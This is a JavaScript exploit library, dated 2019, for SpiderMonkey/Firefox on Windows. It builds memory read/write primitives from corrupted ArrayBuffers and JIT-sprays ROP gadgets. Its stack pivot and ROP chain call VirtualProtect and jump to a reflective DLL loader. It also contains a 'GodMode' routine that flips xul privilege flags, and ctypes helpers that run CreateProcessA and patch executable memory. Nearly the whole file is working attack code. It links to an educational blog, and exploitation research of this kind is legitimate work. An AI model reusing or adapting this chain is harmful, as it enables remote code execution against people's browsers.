// Axel '0vercl0k' Souchet - 19 November 2019

BigInt.fromBytes = Bytes => {
    let Int = BigInt(0);
    for(const Byte of Bytes.reverse()) {
        Int = (Int << 8n) | BigInt(Byte);
    }
    return Int;
};

BigInt.toBytes = Addr => {
    let Remainder = Addr;
    const Bytes = [];
    while(Remainder != 0) {
        const Low = Remainder & 0xffn;
        Remainder = Remainder >> 8n;
        Bytes.push(Number(Low));
    }

    //
    // Pad it if we need to do so.
    //

    if(Bytes.length < 8) {
        while(Bytes.length != 8) {
            Bytes.push(0);
        }
    }

    return Bytes;
};

BigInt.fromUint32s = Uint32s => {
    let Int = BigInt(0);
    for(const Uint32 of Uint32s.reverse()) {
        Int = (Int << 32n) | BigInt(Uint32);
    }
    return Int;
};

BigInt.fromJSValue = Addr => {
    return Addr & 0x0000ffffffffffffn;
};

//
// Walks the IAT of ModuleBase until finding the ImportDescriptor
// for DllName2Find.
//

function FindImportDescriptor(Memory, ModuleBase, DllName2Find) {
    // dt ntdll!_IMAGE_DOS_HEADER e_lfanew
    //   +0x03c e_lfanew : Int4B
    const ImgDosHeader_e_lfanew = Memory.Read32(ModuleBase + 0x3cn);
    const ImgNtHeaders64 = ModuleBase + ImgDosHeader_e_lfanew;
    // 0:000> dt ntdll!_IMAGE_NT_HEADERS64 OptionalHeader
    //   +0x018 OptionalHeader : _IMAGE_OPTIONAL_HEADER64
    // 0:000> dt ntdll!_IMAGE_OPTIONAL_HEADER64 DataDirectory
    //   +0x070 DataDirectory : [16] _IMAGE_DATA_DIRECTORY
    // 0:000> ?? sizeof(_IMAGE_DATA_DIRECTORY)
    // unsigned int64 8
    // 0:000> dt ntdll!_IMAGE_DATA_DIRECTORY
    // ntdll!_IMAGE_DATA_DIRECTORY
    //   +0x000 VirtualAddress   : Uint4B
    let ImportDescriptor = ModuleBase + Memory.Read32(
        ImgNtHeaders64 + 0x18n + 0x70n + (1n * 8n)
    );

    let Found = false;

    while(1337) {
        const NameRVA = Memory.Read32(
            ImportDescriptor + 3n*4n
        );

        if(NameRVA == 0n) {

            //
            // It means the RVA of the name was 0 and as a result
            // NameAddress is pointing right on the MZ header of the Module.
            //

            break;
        }

        const NameAddress = ModuleBase + NameRVA;
        const Name = Memory.ReadString(NameAddress);
        dbg('[*] ImportDescriptor @ ' + ImportDescriptor.toString(16) + ': ' + NameAddress.toString(16) + ': ' + Name);
        if(Name.toLowerCase() == DllName2Find.toLowerCase()) {
            Found = true;
            break;
        }

        ImportDescriptor = ImportDescriptor + 0x14n;
    }

    if(!Found) {
        dbg('[-] Could not find the import descriptor for ' + DllName2Find);
        ImportDescriptor = null;
    }

    return ImportDescriptor;
}

//
// Walks the imported APIs by the ImportDescriptor and returns their address.
//

function FindImportedAPIsFromImportDescriptor(Memory, ModuleBase, ImportDescriptor, ...APINames) {
    const Results = {};
    const ImportNames = ModuleBase + Memory.Read32(ImportDescriptor);
    const APINamesLower = APINames.map(p => p.toLowerCase());
    const ImportAddresses = ModuleBase + Memory.Read32(
        ImportDescriptor + 4n * 4n
    );

    dbg('[*] Looking for ' + APINames.join(', ') + '..');
    dbg('[+]   Imports Name Array is @ ' + ImportNames.toString(16));
    dbg('[+]   Imports Address Array is @ ' + ImportAddresses.toString(16));

    let Idx = BigInt(0);
    while(1337) {
        const ImportAddress = Memory.ReadPtr(ImportAddresses + Idx * 8n);
        if(ImportAddress == 0n) {

            //
            // We are done walking the imports for this descriptor.
            //

            break;
        }

        const ImportNameAddress = ModuleBase + Memory.ReadPtr(
            ImportNames + Idx * 8n
        ) + 2n;
        const ImportName = Memory.ReadString(ImportNameAddress);
        const ImportNameLower = ImportName.toLowerCase();
        dbg('[*]     Function: ' + ImportName + ' is @ ' + ImportAddress.toString(16));
        if(APINamesLower.includes(ImportNameLower)) {
            Results[ImportNameLower] = ImportAddress;
        }

        if(Object.keys(Results).length == APINamesLower.length) {

            //
            // If we found all our APIs then we're out!
            //

            break;
        }

        Idx++;
    }

    const Addresses = [];
    for(const APINameLower of APINamesLower) {
        const Address = Results.hasOwnProperty(APINameLower) ? Results[APINameLower] : null;
        Addresses.push(Address);
    }

    if(Addresses.length == 1) {

        //
        // If we only have one address to return, let's just return it as opposed to
        // returning the Array.
        // This allows the caller to invoke the function like the below:
        //   `const foo = FindImportedAPIsFromImportDescriptor(Kern32, 'foo');`
        // as opposed to:
        //   `const [foo] = FindImportedAPIsFromImportDescriptor(Kern32, 'foo');`
        //

        return Addresses[0];
    }

    return Addresses;
}

//
// Walks the IAT and returns the addresses of the APIs requested.
//

function FindImportedAPIs(Memory, ModuleBase, DllName, ...APINames) {
    const ImportDescriptor = FindImportDescriptor(Memory, ModuleBase, DllName);
    if(ImportDescriptor == null) {

        //
        // If we don't find an ImportDescriptor, we return an array of nulls; one for
        // each of the requested API.
        //

        const Nulls = APINames.map(_ => null);
        if(APINames.length == 1) {
            return Nulls[0];
        }

        return Nulls;
    }

    return FindImportedAPIsFromImportDescriptor(
        Memory, ModuleBase,
        ImportDescriptor,
        ...APINames
    );
}

//
// Scan back page, by page until finding the base of the module
// Address belongs to.
//

function FindModuleBase(Memory, Address) {
    let Base = Address & 0xfffffffffffff000n;
    while(1337) {
        const MZ = Array.from(Memory.Read(Base, 2)).map(
            c => String.fromCharCode(c)
        ).join('');

        if(MZ == 'MZ') {
            break;
        }

        Base = Base - 0x1000n;
    }

    return Base;
}

//
// Compare two arrays.
//

function ArrayCmp(A, B) {
    if(A.length != B.length) {
        return false;
    }

    for(let Idx = 0; Idx < A.length; Idx++) {
        if(A[Idx] != B[Idx]) {
            return false;
        }
    }

    return true;
}

//
// BYOG documented here:
//  https://doar-e.github.io/blog/2018/11/19/introduction-to-spidermonkey-exploitation/#force-the-jit-of-arbitrary-gadgets-bring-your-own-gadgets
//

const BringYourOwnGadgets = function () {

    //
    // Magic:
    //  00000350`ed5f77f8 49bb30766572636c306b mov r11,6B306C6372657630h
    //  0:000> db 00000350`ed5f77f8+2 l8
    //  00000350`ed5f77fa  30 76 65 72 63 6c 30 6b                          0vercl0k
    //

    const Magic = 2.1091131882779924e+208;

    //
    // Pop:
    //  0:000> u 0x00000350ed5f7808
    //  00000350`ed5f7808 59              pop     rcx
    //  00000350`ed5f7809 5a              pop     rdx
    //  00000350`ed5f780a 4158            pop     r8
    //  00000350`ed5f780c 4159            pop     r9
    //  00000350`ed5f780e c3              ret
    //  00000350`ed5f780f 90              nop
    //

    const PopRegisters = -6.380930795567661e-228;

    //
    // Pivot:
    //  0:000> u 0x00000350ed5f7816-2 l1
    //  00000350`ed5f7814 49bb4887e2909090eb06 mov r11,6EB909090E28748h
    //  0:000> u 0x00000350ed5f7816 l5
    //  00000350`ed5f7816 4887e2          xchg    rsp,rdx
    //  00000350`ed5f7819 90              nop
    //  00000350`ed5f781a 90              nop
    //  00000350`ed5f781b 90              nop
    //  00000350`ed5f781c eb06            jmp     00000350`ed5f7824
    //  0:000> u 00000350`ed5f7824 l4
    //  00000350`ed5f7824 488b2424        mov     rsp,qword ptr [rsp]
    //  00000350`ed5f7828 90              nop
    //  00000350`ed5f7829 90              nop
    //  00000350`ed5f782a eb06            jmp     00000350`ed5f7832
    //  0:000> u 00000350`ed5f7832
    //  00000350`ed5f7832 488b642438      mov     rsp,qword ptr [rsp+38h]
    //  00000350`ed5f7837 c3              ret
    //  00000350`ed5f7838 90              nop
    //  00000350`ed5f7839 90              nop
    //

    const Pivot0 = 2.4879826032820723e-275;
    const Pivot1 = 2.487982018260472e-275;
    const Pivot2 = -6.910095487116115e-229;
};

//
// This function returns a set of read/write primitives built off two consecutive ArrayBuffers.
//

function BuildPrimitives(AB1, AB2) {
    const Read = (Addr, Length) => {
        let OddOffset = 0;
        if((Addr & 0x1n) == 1n) {
            Length += 1;
            OddOffset = 1;
        }

        //
        // Fix AB2's base address from AB1.
        //

        Addr = Addr >> 1n;
        const Master = new Uint8Array(AB1);
        for(const [Idx, Byte] of BigInt.toBytes(Addr).entries()) {
            Master[Idx + 0x40] = Byte;
        }

        const View = new Uint8Array(AB2);
        return View.slice(OddOffset, Length);
    };

    const Write = (Addr, Values) => {
        let OddOffset = 0;
        if((Addr & 0x1n) == 1n) {
            OddOffset = 1;
        }

        //
        // Fix AB2's base address from AB1.
        //

        Addr = Addr >> 1n;
        const Master = new Uint8Array(AB1);
        for(const [Idx, Byte] of BigInt.toBytes(Addr).entries()) {
            Master[Idx + 0x40] = Byte;
        }

        const View = new Uint8Array(AB2);
        for(const [Idx, Byte] of Values.entries()) {
            View[OddOffset + Idx] = Number(Byte);
        }
    };

    const ReadPtr = Addr => {
        return BigInt.fromBytes(Read(Addr, 8));
    };

    const Read32 = Addr => {
        return BigInt.fromBytes(Read(Addr, 4));
    };

    const ReadString = Addr => {
        let S = '';
        while(1337) {
            const Byte = Read(Addr, 1);
            Addr += 1n;
            if(Byte == 0n) {
                break;
            }

            S += String.fromCharCode(Number(Byte));
        }
        return S;
    };

    const WritePtr = (Addr, Ptr) => {
        return Write(Addr, BigInt.toBytes(Ptr));
    };

    const AddrOf = Obj => {
        AB2.hell_on_earth = Obj;
        const SlotsAddress = BigInt.fromBytes(
            new Uint8Array(AB1).slice(48, 48 + 8)
        );
        return BigInt.fromJSValue(ReadPtr(SlotsAddress));
    };

    return {
        Read : Read,
        Read32 : Read32,
        ReadPtr : ReadPtr,
        ReadString : ReadString,
        Write : Write,
        WritePtr : WritePtr,
        AddrOf : AddrOf,
    };
}

//
// This function implements kernelbase!GetModuleHandleA with the `ctypes` JS module.
//

function GetModuleHandleA(Lib) {
    function _GetModuleHandleA(Lib) {
        const { ctypes } = Components.utils.import('resource://gre/modules/ctypes.jsm');
        const kernelbase = ctypes.open('kernelbase.dll');

        const FunctPtr = kernelbase.declare('GetModuleHandleA',
            ctypes.winapi_abi,
            ctypes.uintptr_t,
            ctypes.char.ptr,
        );

        const Success = FunctPtr(Lib);
        kernelbase.close();
        return Success;
    }

    const { Services } = Components.utils.import('resource://gre/modules/Services.jsm');
    const Cu = Components.utils;
    const Sbx = Cu.Sandbox(Services.scriptSecurityManager.getSystemPrincipal());
    const Code = _GetModuleHandleA.toSource();
    Cu.evalInSandbox(Code, Sbx);
    const Ret = Sbx._GetModuleHandleA(Lib);
    Cu.nukeSandbox(Sbx);
    return Ret
}

//
// This function implements msvcrt!memcpy with the `ctypes` JS module.
//

function memcpy(Dst, Src) {
    function _memcpy(Dst, Src) {
        const { ctypes } = Components.utils.import('resource://gre/modules/ctypes.jsm');
        const msvcrt = ctypes.open('msvcrt.dll');

        const FunctPtr = msvcrt.declare('memcpy',
            ctypes.winapi_abi,
            ctypes.voidptr_t,
            ctypes.uintptr_t,
            ctypes.char.ptr,
            ctypes.size_t
        );

        const Dest = new ctypes.uintptr_t(Dst.toString());
        const Source = new Uint8Array(Src);
        const Num = new ctypes.size_t(Src.length);

        const Success = FunctPtr(Dest, Source, Num);
        msvcrt.close();
        return Success;
    }

    const { Services } = Components.utils.import('resource://gre/modules/Services.jsm');
    const Cu = Components.utils;
    const Sbx = Cu.Sandbox(Services.scriptSecurityManager.getSystemPrincipal());
    const Code = _memcpy.toSource();
    Cu.evalInSandbox(Code, Sbx);
    const Ret = Sbx._memcpy(Dst, Src);
    Cu.nukeSandbox(Sbx);
    return Ret
}

//
// This function implements kernelbase!VirtualProtect with the `ctypes` JS module.
//

function VirtualProtect(Address, Size, NewProtect) {
    function _VirtualProtect(Address, Size, NewProtect) {
        const { ctypes } = Components.utils.import('resource://gre/modules/ctypes.jsm');
        const kernelbase = ctypes.open('kernelbase.dll');

        const FunctPtr = kernelbase.declare('VirtualProtect',
            ctypes.winapi_abi,
            ctypes.bool,
            ctypes.uintptr_t,
            ctypes.uintptr_t,
            ctypes.uint32_t,
            ctypes.uint32_t.ptr
        );

        const Dest = new ctypes.uintptr_t(Address.toString());
        const OldNewProtect = new ctypes.uint32_t(0);
        const Success = FunctPtr(Dest, Size, NewProtect, OldNewProtect.address());
        kernelbase.close();
        return [Success, OldNewProtect];
    }

    const { Services } = Components.utils.import('resource://gre/modules/Services.jsm');
    const Cu = Components.utils;
    const Sbx = Cu.Sandbox(Services.scriptSecurityManager.getSystemPrincipal());
    const Code = _VirtualProtect.toSource();
    Cu.evalInSandbox(Code, Sbx);
    const [Success, OldNewProtect] = Sbx._VirtualProtect(Address, Size, NewProtect);
    Cu.nukeSandbox(Sbx);
    return [Success, OldNewProtect];
}

//
// This function implements kernelbase!CreateProcessA with the `ctypes` JS module.
//

function CreateProcessA(CommandLine) {
    function _CreateProcess(CommandLine) {
        const { ctypes } = Components.utils.import('resource://gre/modules/ctypes.jsm');
        const kernelbase = ctypes.open('kernelbase.dll');

        // typedef struct _STARTUPINFOA {
        //   DWORD  cb;
        //   LPSTR  lpReserved;
        //   LPSTR  lpDesktop;
        //   LPSTR  lpTitle;
        //   DWORD  dwX;
        //   DWORD  dwY;
        //   DWORD  dwXSize;
        //   DWORD  dwYSize;
        //   DWORD  dwXCountChars;
        //   DWORD  dwYCountChars;
        //   DWORD  dwFillAttribute;
        //   DWORD  dwFlags;
        //   WORD   wShowWindow;
        //   WORD   cbReserved2;
        //   LPBYTE lpReserved2;
        //   HANDLE hStdInput;
        //   HANDLE hStdOutput;
        //   HANDLE hStdError;
        // } STARTUPINFOA, *LPSTARTUPINFOA;
        const STARTUPINFOA = new ctypes.StructType('STARTUPINFOA', [
            { 'cb' : ctypes.uint32_t },
            { 'lpReserved' : ctypes.char.ptr },
            { 'lpDesktop' : ctypes.char.ptr },
            { 'lpTitle' : ctypes.char.ptr },
            { 'dwX' : ctypes.uint32_t },
            { 'dwY' : ctypes.uint32_t },
            { 'dwXSize' : ctypes.uint32_t },
            { 'dwYSize' : ctypes.uint32_t },
            { 'dwXCountChars' : ctypes.uint32_t },
            { 'dwYCountChars' : ctypes.uint32_t },
            { 'dwFillAttribute' : ctypes.uint32_t },
            { 'dwFlags' : ctypes.uint32_t },
            { 'wShowWindow' : ctypes.uint16_t },
            { 'cbReserved2' : ctypes.uint16_t },
            { 'lpReserved2' : ctypes.voidptr_t },
            { 'hStdInput' : ctypes.voidptr_t },
            { 'hStdOutput' : ctypes.voidptr_t },
            { 'hStdError' : ctypes.voidptr_t }
        ]);

        // typedef struct _PROCESS_INFORMATION {
        //     HANDLE hProcess;
        //     HANDLE hThread;
        //     DWORD  dwProcessId;
        //     DWORD  dwThreadId;
        //   } PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;
        const PROCESS_INFORMATION = new ctypes.StructType('PROCESS_INFORMATION', [
            { 'hProcess' : ctypes.voidptr_t },
            { 'hThread' : ctypes.voidptr_t },
            { 'dwProcessId' : ctypes.uint32_t },
            { 'dwThreadId' : ctypes.uint32_t },
        ]);

        // BOOL CreateProcessA(
        //     LPCSTR                lpApplicationName,
        //     LPSTR                 lpCommandLine,
        //     LPSECURITY_ATTRIBUTES lpProcessAttributes,
        //     LPSECURITY_ATTRIBUTES lpThreadAttributes,
        //     BOOL                  bInheritHandles,
        //     DWORD                 dwCreationFlags,
        //     LPVOID                lpEnvironment,
        //     LPCSTR                lpCurrentDirectory,
        //     LPSTARTUPINFOA        lpStartupInfo,
        //     LPPROCESS_INFORMATION lpProcessInformation
        //   );
        const FunctPtr = kernelbase.declare('CreateProcessA',
            ctypes.winapi_abi,
            ctypes.bool,
            ctypes.voidptr_t,
            ctypes.char.ptr,
            ctypes.voidptr_t,
            ctypes.voidptr_t,
            ctypes.bool,
            ctypes.uint32_t,
            ctypes.voidptr_t,
            ctypes.voidptr_t,
            STARTUPINFOA.ptr,
            PROCESS_INFORMATION.ptr
        );

        const ApplicationName = new ctypes.voidptr_t(0);
        const ProcessAttributes = new ctypes.voidptr_t(0);
        const ThreadAttributes = new ctypes.voidptr_t(0);
        const InheritHandles = new ctypes.bool(false);
        const CreationFlags = new ctypes.uint32_t(0);
        const Environment = new ctypes.voidptr_t(0);
        const CurrentDirectory = new ctypes.voidptr_t(0);
        const StartupInfo = new STARTUPINFOA();
        StartupInfo.cb = STARTUPINFOA.size;
        const ProcessInformation = new PROCESS_INFORMATION();

        const Success = FunctPtr(
            ApplicationName,
            CommandLine,
            ProcessAttributes,
            ThreadAttributes,
            InheritHandles,
            CreationFlags,
            Environment,
            CurrentDirectory,
            StartupInfo.address(),
            ProcessInformation.address()
        );

        kernelbase.close();
        return Success;
    }

    const { Services } = Components.utils.import('resource://gre/modules/Services.jsm');
    const Cu = Components.utils;
    const Sbx = Cu.Sandbox(Services.scriptSecurityManager.getSystemPrincipal());
    const Code = _CreateProcess.toSource();
    Cu.evalInSandbox(Code, Sbx);
    const Ret = Sbx._CreateProcess(CommandLine);
    Cu.nukeSandbox(Sbx);
    return Ret
}

//
// This function allows the user to patch executeable section using ctypes.
//

function PatchCode(PatchAddress, PatchContent) {
    const PAGE_EXECUTE_READWRITE = 0x40;
    const [Status, OldProtect] = VirtualProtect(
        PatchAddress,
        PatchContent.length,
        PAGE_EXECUTE_READWRITE
    );

    if(!Status) {
        return false;
    }

    memcpy(PatchAddress, PatchContent);
    const [_Status, _OldNewProtect] = VirtualProtect(
        PatchAddress,
        PatchContent.length,
        OldProtect
    );

    return true;
}

//
// This function gives god mode to the current page.
//

function GodMode(AB1, AB2, Primitives, XulsAutomationPrefIsSet, XuldisabledForTest) {
    if(Primitives == undefined) {

        //
        // Build up the primitives to be able to get to work.
        //

        Primitives = BuildPrimitives(AB1, AB2);
    }

    //
    // Find js/xul base address
    //

    const EmptyElementsHeaders = BigInt.fromBytes(
        new Uint8Array(AB1).slice(0x38, 0x38 + 8)
    );
    const JSBase = FindModuleBase(Primitives, EmptyElementsHeaders);
    dbg('[+] xul.dll is @ ' + JSBase.toString(16));

    const XulsAutomationPrefIsSetAddress = JSBase + XulsAutomationPrefIsSet;
    dbg(`Snipping xul!sAutomationPrefIsSet @ ${XulsAutomationPrefIsSetAddress.toString(16)}`);
    Primitives.Write(XulsAutomationPrefIsSetAddress, [1n]);

    const XuldisabledForTestAddress = JSBase + XuldisabledForTest;
    dbg(`Snipping xul!XuldisabledForTestAddress @ ${XuldisabledForTestAddress.toString(16)}`);
    Primitives.Write(XuldisabledForTestAddress, [1n]);
}

//
// This is documented here:
//   https://doar-e.github.io/blog/2018/11/19/introduction-to-spidermonkey-exploitation/
//

function Pwn(AB1, AB2) {

    //
    // Build up the primitives to be able to get to work.
    //

    const Primitives = BuildPrimitives(AB1, AB2);

    //
    // Find js/xul base address
    //

    const EmptyElementsHeaders = BigInt.fromBytes(
        new Uint8Array(AB1).slice(0x38, 0x38 + 8)
    );
    const JSBase = FindModuleBase(Primitives, EmptyElementsHeaders);
    dbg('[+] js.exe is @ ' + JSBase.toString(16));

    //
    // Go and find VirtualProtect.
    //

    const VirtualProtect = FindImportedAPIs(Primitives, JSBase, 'kernel32.dll', 'VirtualProtect');
    dbg('[+] kernel32!VirtualProtect is @ ' + VirtualProtect.toString(16));
    const ReflectiveDllAddress = Primitives.ReadPtr(
        Primitives.AddrOf(ReflectiveDll) + 8n * 7n
    );
    dbg('[+] Reflective dll is @ ' + ReflectiveDllAddress.toString(16));
    const ReflectiveLoaderAddress = ReflectiveDllAddress + ReflectiveLoaderOffset;
    dbg('[+] ReflectiveLoader is @ ' + ReflectiveLoaderAddress.toString(16));

    //
    // Bring your own gadgetz boiz!
    //

    const Magic = '0vercl0k'.split('').map(c => c.charCodeAt(0));

    //
    // Force JITing of the gadgets.
    //

    for(let Idx = 0; Idx < 12; Idx++) {
        BringYourOwnGadgets();
    }

    //
    // Retrieve addresses of the gadgets.
    //

    const BringYourOwnGadgetsAddress = Primitives.AddrOf(BringYourOwnGadgets);
    const JsScriptAddress = Primitives.ReadPtr(
        BringYourOwnGadgetsAddress + 0x30n
    );

    const JittedAddress = Primitives.ReadPtr(JsScriptAddress);
    dbg('[+] JITed function is @ ' + JittedAddress.toString(16));

    let JitPageStart = JittedAddress & 0xfffffffffffff000n;
    dbg('[+] JIT page of gadget store is @ ' + JitPageStart.toString(16));

    //
    // Scan the JIT page, pages by pages until finding the magic value. Our
    // gadgets follow it.
    //

    let MagicAddress = 0;
    let FoundMagic = false;
    for(let PageIdx = 0; PageIdx < 3 && !FoundMagic; PageIdx++) {
        const JitPageContent = Primitives.Read(JitPageStart, 0x1000);
        dbg('[+] Scanning JIT page @ ' + JitPageStart.toString(16));
        for(let ContentIdx = 0; ContentIdx < JitPageContent.byteLength; ContentIdx++) {
            const Needle = JitPageContent.subarray(
                ContentIdx, ContentIdx + Magic.length
            );

            if(ArrayCmp(Needle, Magic)) {

                //
                // If we find the magic value, then we compute its address, and we getta outta here!
                //

                MagicAddress = JitPageStart + BigInt(ContentIdx);
                FoundMagic = true;
                break;
            }
        }

        JitPageStart = JitPageStart + 0x1000n;
    }

    dbg('[+] Magic is at @ ' + MagicAddress.toString(16));
    const PopRcxRdxR8R9Address = MagicAddress + 0x8n + 4n + 2n;
    const RetAddress = PopRcxRdxR8R9Address + 6n;
    const PivotAddress = PopRcxRdxR8R9Address + 0x8n + 4n + 2n;

    dbg('[+] PopRcxRdxR8R9 is @ ' + PopRcxRdxR8R9Address.toString(16));
    dbg('[+] Pivot is @ ' + PivotAddress.toString(16));
    dbg('[+] Ret is @ ' + RetAddress.toString(16));

    //
    // Prepare the backing buffer for the ROP chain. It is also the
    // object we will use to hijack control flow later.
    //

    const TargetSize = 0x10000;
    const Target = new Uint8Array(TargetSize);
    const TargetBufferAddress = Primitives.ReadPtr(
        Primitives.AddrOf(Target) + 8n * 7n
    );

    //
    // We want the ropchain to start in the middle of the space because
    // VirtualProtect might use a bunch of stack space and might underflow
    // our buffer.
    // In order to make things simple regarding our stack-pivot, we just fill
    // the buffer with a ret-sled that will land on our rop-chain which is located
    // in the middle of the region.
    //

    let Offset2RopChain = TargetSize / 2;
    for(let Idx = 0; Idx < TargetSize; Idx += 8) {
        Target.set(BigInt.toBytes(RetAddress), Idx);
    }

    //
    // Prepare the ROP chain which makes the shellcode executable and jump to it.
    //

    const PAGE_EXECUTE_READ = 0x20n;
    const RopChain = [

        //
        // Prepare arguments for a VirtualProtect call.
        //

        PopRcxRdxR8R9Address,
        ReflectiveDllAddress,
        BigInt(ReflectiveDll.length),
        PAGE_EXECUTE_READ,
        TargetBufferAddress,

        //
        // Make the reflective dll rwx memory.
        //

        VirtualProtect,

        //
        // We pop the homies (home space).
        //

        PopRcxRdxR8R9Address,
        0xaaaaaaaaaaaaaaaan,
        0xbbbbbbbbbbbbbbbbn,
        0xccccccccccccccccn,
        0xddddddddddddddddn,

        //
        // We pop some registers to pass parameters to our payload.
        //

        PopRcxRdxR8R9Address,
        ReflectiveDllAddress,
        0n,
        0n,
        0n,

        //
        // Let's go to the reflective loader.
        //

        ReflectiveLoaderAddress
    ];

    for(const Entry of RopChain) {
        Target.set(BigInt.toBytes(Entry), Offset2RopChain);
        Offset2RopChain += 8;
    }

    //
    // Retrieve a bunch of addresses needed to replace Target's clasp_ field
    //

    const TargetAddress = Primitives.AddrOf(Target);
    const TargetGroup_ = Primitives.ReadPtr(TargetAddress);
    const TargetClasp_ = Primitives.ReadPtr(TargetGroup_);
    const TargetcOps = Primitives.ReadPtr(TargetClasp_ + 0x10n);
    const TargetClasp_Address = TargetGroup_ + 0x0n;

    const TargetShapeOrExpando_ = Primitives.ReadPtr(TargetAddress + 0x8n);
    const TargetBase_ = Primitives.ReadPtr(TargetShapeOrExpando_);
    const TargetBaseClasp_Address = TargetBase_ + 0n;

    //
    // Prepare backing memory for the js::Class object, as well as the js::ClassOps object
    //

    // 0:000> ?? sizeof(js!js::Class) + sizeof(js::ClassOps)
    // unsigned int64 0x88
    const MemoryBackingObject = new Uint8Array(0x88);
    const MemoryBackingObjectAddress = Primitives.AddrOf(MemoryBackingObject);
    const ClassMemoryBackingAddress = Primitives.ReadPtr(
        MemoryBackingObjectAddress + 7n * 8n
    );
    // 0:000> ?? sizeof(js!js::Class)
    // unsigned int64 0x30
    const ClassOpsMemoryBackingAddress = ClassMemoryBackingAddress + 0x30n;
    dbg('[+] js::Class / js::ClassOps backing memory is @ ' + Primitives.AddrOf(
        MemoryBackingObject
    ).toString(16));

    //
    // Copy the original Class object into our backing memory, and hijack
    // the cOps field
    //

    MemoryBackingObject.set(Primitives.Read(TargetClasp_, 0x30), 0);
    MemoryBackingObject.set(BigInt.toBytes(ClassOpsMemoryBackingAddress), 0x10);

    //
    // Copy the original ClassOps object into our backing memory and hijack
    // the add property
    //

    MemoryBackingObject.set(Primitives.Read(TargetcOps, 0x50), 0x30);
    MemoryBackingObject.set(BigInt.toBytes(PivotAddress), 0x30);

    //
    // At this point, hijack Target's clasp_ fields; from both group and the
    // shape. Note that we also update the shape as there's an assert in
    // the debug build that makes sure the two classes matches
    //

    dbg("[*] Overwriting Target's clasp_ @ " + TargetClasp_Address.toString(16));
    Primitives.WritePtr(TargetClasp_Address, ClassMemoryBackingAddress);
    dbg("[*] Overwriting Target's shape clasp_ @ " + TargetBaseClasp_Address.toString(16));
    Primitives.WritePtr(TargetBaseClasp_Address, ClassMemoryBackingAddress);

    //
    // Let's pull the trigger now
    //

    dbg('[*] Pulling the trigger bebe..');
    Target.im_falling_and_i_cant_turn_back = 1;
}
